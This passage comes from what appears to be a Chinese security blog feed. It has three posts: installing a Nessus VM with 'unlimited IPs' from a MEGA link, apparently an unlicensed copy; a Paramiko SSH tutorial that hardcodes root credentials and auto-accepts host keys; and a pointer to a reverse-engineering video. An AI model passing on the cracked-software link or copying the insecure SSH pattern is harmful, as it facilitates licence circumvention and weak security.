    <content type="text"><![CDATA[最懊恼的就是安装这种软件了，免费版本只能扫描16个IP，收费版本在天朝没人会去买，买完也没人去分享，而现在，我来安利一波可以无限IP，而且还傻瓜式的Nessus安装方式. 准备工具 VMware Workstation (Version &gt;= 12) 科学上网工具 眼睛和脑子 下载Nessus(VMware版)https://mega.nz/#!0YkSDYpY!JndpKpH5yB3hDNV-091jOwPhW9rLK9iNSzuF9nTz-i0 部署Nessus导入至VMware首先解压下载的压缩文件，放到你能记得住的地方 然后打开vmware, File -&gt; Open, 选择Nessus 8_VM12.ovf文件. 开机运行 配置网卡默认的用户名和密码都在描述中写了, 按照描述进行操作绝对没问题的. 开机你肯定没问题了，按照他的要求访问https://1.1.2.1:8834你肯定访问不了，你需要修改网卡配置 这样，将网卡2改成NAT 就可以自动获取IP地址, 获取完毕直接输入ifconfig查看自动获取的IP地址, 访问自动获取的IP地址加端口号…哦对了, 一定要是https, 比如我自动获取的IP地址为192.168.23.134, 那么我在我物理机访问https://192.168.23.134:8834就可以了. 到这里就完全可以正常运行以及进行扫描了, 怎么运行扫描就要看你了, 赶紧继续学习吧~]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>扫描</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Paramiko Python远程连接工具]]></title>
    <url>%2F2019%2F09%2F29%2F2-paramiko-remote-exec%2F</url>
    <content type="text"><![CDATA[Paramiko是一个Python的远程操作库，可以进行SSH, SFTP等远程连接操作. 来学习学习怎么使用吧 安装Paramiko python3 -m pip install paramiko 开始使用导入paramikoimport paramiko 初始化SSHClientclient = paramiko.SSHClient() client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 连接主机我的Linux主机是192.168.1.40，用户名为root, 密码为admin123. client.connect(hostname="192.168.1.40", username="root", password="admin123.") 连接上会有几条警告，可以无视掉，或者直接屏蔽警告信息 发送命令执行一个ifconfig命令 stdin, stdout, stderr = client.exec_command("ifconfig") 注意这里, exec_command的返回值为tuple类型可以通过python3 -m pydoc paramiko.SSHClient.exec_command查看源码. 查看命令返回值for i in stdout.readlines(): print(i) 这样就得到了返回值 关闭连接不要总是依赖上下文, 要学会手动释放资源关闭连接 client.close() 到这里, paramiko的SSHClient用法就结束了，paramiko还支持SFTPClient等其他远程操作, 自己发掘吧~]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>paramiko</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Simple Reverse (简单的逆向)]]></title>
    <url>%2F2019%2F09%2F28%2F1-Simple-Reverse%2F</url>
    <content type="text"><![CDATA[学习使用IDA Pro 和 x64dbg反编译一个C语言程序. 准备工具 DevC++ IDA Pro x64dbg 开始动手！我直接做成了视频. 直接来看吧.【逆向工程】IDA Pro + x64dgb反编译一个应用程序]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
</search>
